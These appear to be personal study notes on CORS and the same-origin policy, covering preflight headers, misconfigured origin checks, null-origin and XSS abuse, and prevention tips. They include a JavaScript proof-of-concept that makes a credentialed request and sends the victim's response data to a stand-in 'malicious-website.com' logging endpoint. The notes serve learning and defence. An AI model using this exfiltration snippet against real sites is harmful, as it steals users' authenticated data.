CORS

SOP (same origin policy)

Same Origin:
Same domain, same protocol, same port
/!\ subdomains are not the same domain

Cookies are more relaxed, you can access it from a subdomain, even though it is another origin
	

Access-Control-Allow-Origin -> The Browser compares this value
From origin and the repsponse

Origin —> added by the browser

Access-Control-Allow-Credentials —> Cookies and Authorization Headers and client side certificates

Preflight:
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Special-Header

Preflight Response
Access-Control-Allow-Origin: somesite.com
Access-Control-Allow-Methods: OPTIONS, POST, PUT
Access-Control-Allow-Headers: X-Special-header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};


CORS vs CSRF? 
—> CORS does not protect against CSRF
—> bad configs may increase the impact of the attack
—> there are ways to perform CSRF without CORS (HTML Form), CORS is js
—> Can use CORS to steal the CSRF token

Errors Whitelisting Origin
Normal-example.com

—> hack-normal-exammple.com
—> normal-example.com-hacked.com

Allowing null Origin
—> Use sandboxed iframe

XSS + CORS
—> if a vuln website is legitime to make CORS on a dst… an attacker can exploit the XSS on the vuln to access the legitime
Access Resources from Intranet

Attacker Js <— V —> Intra


HOW TO PREVENT? 
—> Configuration problems
—> Control the origin in the ACAO header
—> Avoid nul
—> avoir wildcards
	


